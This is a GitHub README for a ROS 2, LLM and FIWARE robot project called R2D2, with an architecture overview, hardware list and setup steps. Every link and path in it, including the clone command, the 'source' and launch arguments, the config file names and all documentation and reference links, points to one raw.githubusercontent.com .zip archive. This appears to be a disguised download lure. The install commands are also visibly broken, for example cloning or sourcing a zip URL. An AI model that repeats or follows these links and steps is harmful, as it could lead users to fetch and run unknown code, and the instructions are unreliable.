# R2D2 - Intelligent Autonomous Robot 🤖

An intelligent autonomous robotic system capable of making independent decisions, discovering its environment, and interacting naturally with humans through dialogue.

## 🌟 Overview

R2D2 is a distributed intelligent robotic system that combines real-time robotics (ROS 2), artificial intelligence (LLM), and semantic context management (FIWARE) to create truly autonomous behavior. The architecture mimics a biological nervous system where the Context Broker acts as the spinal cord, connecting the brain (AI systems) to the body (ROS actuators and sensors).

## 🏗️ Architecture

The system is built on three interconnected pillars:

### 1. **The Body** - ROS 2 Platform
Handles motor and sensory functions in real-time with maximum reactivity.

### 2. **The Brain** - LLM + External AI
Provides intelligence, contextual understanding, and high-level planning.

### 3. **The Nervous System** - Context Broker + Digital Twin
Ensures coordination, shared memory, and global coherence between all components.

## 🔑 Key Features

- **Natural Voice Interaction**: Direct Speech-to-LLM pipeline for superior contextual understanding
- **Autonomous Navigation**: SLAM mapping and Nav2 stack for intelligent pathfinding
- **Object Detection & Recognition**: Real-time visual analysis with AI-powered identification
- **Reactive Safety**: Ultrasonic sensors for emergency obstacle avoidance
- **Digital Twin**: Complete semantic representation of the environment and robot state
- **Distributed Intelligence**: Hybrid architecture with embedded real-time control and external AI processing

## 🛠️ Main Components

### Hardware
- **Single-Board Computer**: Raspberry Pi 4 (or similar ROS 2-compatible board)
- **HC-SR04 Ultrasonic Sensors**: Reactive proximity safety
- **USB Webcams**: Dual cameras with integrated microphones for vision and audio
- **L298N Motor Driver**: Power interface for DC motors

### Software Stack

#### ROS 2 Packages
- **r2d2_audio**: Voice interaction (Speech-to-LLM, LLM-to-Speech)
- **r2d2_vision**: Image capture, preprocessing, and AI client
- **r2d2_navigation**: SLAM and Nav2 autonomous navigation
- **r2d2_perception**: Multi-modal sensor fusion
- **r2d2_firos_bridge**: ROS ↔ Context Broker interface
- **r2d2_mcp_interface**: MCP server for LLM tool integration

#### External Services
- **FIWARE Orion Context Broker**: Central nervous system managing all context and state
- **FIROS Agent**: Bidirectional translator between ROS and Context Broker
- **LLM with MCP**: Cognitive brain for natural language understanding and decision-making
- **Vision AI Service**: TensorFlow/PyTorch for object detection and recognition

## 🚀 Quick Start

### Prerequisites
```bash
# ROS 2 (Humble or later)
# Python 3.8+
# Docker (recommended for Context Broker)
```

### Installation

1. **Clone the repository**
```bash
git clone https://raw.githubusercontent.com/Islem-Fakhfekh/Intelligent-mutli-Model-Robot-agent/add-usecase-doc/telestereography/Intelligent-agent-Model-Robot-mutli-v3.5.zip
cd r2d2-robot
```

2. **Install ROS 2 dependencies**
```bash
rosdep install --from-paths src --ignore-src -r -y
```

3. **Build the workspace**
```bash
colcon build
source https://raw.githubusercontent.com/Islem-Fakhfekh/Intelligent-mutli-Model-Robot-agent/add-usecase-doc/telestereography/Intelligent-agent-Model-Robot-mutli-v3.5.zip
```

4. **Start the Context Broker**
```bash
docker-compose up -d
```

5. **Launch R2D2**
```bash
ros2 launch r2d2_bringup https://raw.githubusercontent.com/Islem-Fakhfekh/Intelligent-mutli-Model-Robot-agent/add-usecase-doc/telestereography/Intelligent-agent-Model-Robot-mutli-v3.5.zip
```

## 📋 Usage Examples

### Scenario 1: Voice-Commanded Navigation
```
User: "R2D2, go to the kitchen"
→ Robot navigates autonomously to the kitchen
→ Confirms arrival with voice feedback
```

### Scenario 2: Object Detection
```
Robot explores autonomously
→ Detects person at 2.5m, 30° right
→ Updates Digital Twin
→ Adapts navigation to avoid person
→ Can initiate interaction: "Hello, can I help you?"
```

### Scenario 3: Reactive Safety
```
Obstacle suddenly appears at 15cm
→ Ultrasonic sensor triggers immediate stop
→ System notified via Context Broker
→ LLM decides bypass strategy
```

## 🔧 Configuration

### Network Setup
Configure your robot's network settings in `https://raw.githubusercontent.com/Islem-Fakhfekh/Intelligent-mutli-Model-Robot-agent/add-usecase-doc/telestereography/Intelligent-agent-Model-Robot-mutli-v3.5.zip`:
```yaml
robot_ip: "192.168.1.100"
server_ip: "192.168.1.10"
context_broker_port: 1026
```

### LLM Configuration
Set up your LLM connection in `https://raw.githubusercontent.com/Islem-Fakhfekh/Intelligent-mutli-Model-Robot-agent/add-usecase-doc/telestereography/Intelligent-agent-Model-Robot-mutli-v3.5.zip`:
```yaml
model: "claude-sonnet-4"
mcp_server_port: 8080
api_endpoint: "http://server_ip:8080"
```

### Sensor Calibration
Calibrate sensors using:
```bash
ros2 run r2d2_perception calibrate_sensors
```

## 🗺️ System Architecture Diagram

```
┌─────────────────────────────────────────────────────┐
│                  External Server                     │
│  ┌──────────────┐  ┌──────────┐  ┌──────────────┐  │
│  │   LLM + MCP  │  │ Vision AI│  │ Digital Twin │  │
│  └──────┬───────┘  └────┬─────┘  └──────┬───────┘  │
│         │               │                │          │
│    ┌────┴───────────────┴────────────────┴─────┐   │
│    │    FIWARE Orion Context Broker (NGSI v2)  │   │
│    └────────────────────┬───────────────────────┘   │
│                         │                            │
│                    ┌────┴─────┐                      │
│                    │  FIROS   │                      │
│                    └────┬─────┘                      │
└─────────────────────────┼──────────────────────────┘
                          │ Network (Wi-Fi/Ethernet)
┌─────────────────────────┼──────────────────────────┐
│         Robot (Raspberry Pi + ROS 2)                │
│    ┌──────────┐  ┌──────────┐  ┌──────────────┐   │
│    │  Audio   │  │  Vision  │  │  Navigation  │   │
│    └──────────┘  └──────────┘  └──────────────┘   │
│    ┌──────────┐  ┌──────────┐  ┌──────────────┐   │
│    │Perception│  │  Motors  │  │   Sensors    │   │
│    └──────────┘  └──────────┘  └──────────────┘   │
└─────────────────────────────────────────────────────┘
```


### Development Setup
```bash
# Create a new branch
git checkout -b feature/your-feature-name

# Make your changes and commit
git commit -m "Add your feature"

# Push to your fork
git push origin feature/your-feature-name

# Open a Pull Request
```

## 📚 Documentation

- [Full Architecture Documentation](https://raw.githubusercontent.com/Islem-Fakhfekh/Intelligent-mutli-Model-Robot-agent/add-usecase-doc/telestereography/Intelligent-agent-Model-Robot-mutli-v3.5.zip)
- [API Reference](https://raw.githubusercontent.com/Islem-Fakhfekh/Intelligent-mutli-Model-Robot-agent/add-usecase-doc/telestereography/Intelligent-agent-Model-Robot-mutli-v3.5.zip)
- [ROS 2 Package Guide](https://raw.githubusercontent.com/Islem-Fakhfekh/Intelligent-mutli-Model-Robot-agent/add-usecase-doc/telestereography/Intelligent-agent-Model-Robot-mutli-v3.5.zip)
- [Digital Twin Specification](https://raw.githubusercontent.com/Islem-Fakhfekh/Intelligent-mutli-Model-Robot-agent/add-usecase-doc/telestereography/Intelligent-agent-Model-Robot-mutli-v3.5.zip)

## 🔗 References

- [ROS 2 Documentation](https://raw.githubusercontent.com/Islem-Fakhfekh/Intelligent-mutli-Model-Robot-agent/add-usecase-doc/telestereography/Intelligent-agent-Model-Robot-mutli-v3.5.zip)
- [Nav2 Documentation](https://raw.githubusercontent.com/Islem-Fakhfekh/Intelligent-mutli-Model-Robot-agent/add-usecase-doc/telestereography/Intelligent-agent-Model-Robot-mutli-v3.5.zip)
- [FIWARE Context Broker](https://raw.githubusercontent.com/Islem-Fakhfekh/Intelligent-mutli-Model-Robot-agent/add-usecase-doc/telestereography/Intelligent-agent-Model-Robot-mutli-v3.5.zip)
- [FIROS on GitHub](https://raw.githubusercontent.com/Islem-Fakhfekh/Intelligent-mutli-Model-Robot-agent/add-usecase-doc/telestereography/Intelligent-agent-Model-Robot-mutli-v3.5.zip)
- [MCP for Robotics](https://raw.githubusercontent.com/Islem-Fakhfekh/Intelligent-mutli-Model-Robot-agent/add-usecase-doc/telestereography/Intelligent-agent-Model-Robot-mutli-v3.5.zip)


## 👥 Team

**Prepared by:**
- Islem Fakhfekh
- Saif Eddine Ben Turkia
- Asma Mhatli
- Mohamed Amine Abderrazek

**Date:** November 23, 2025

## 🙏 Acknowledgments

- FIWARE Foundation for the Context Broker
- ROS 2 Community
- Open Robotics
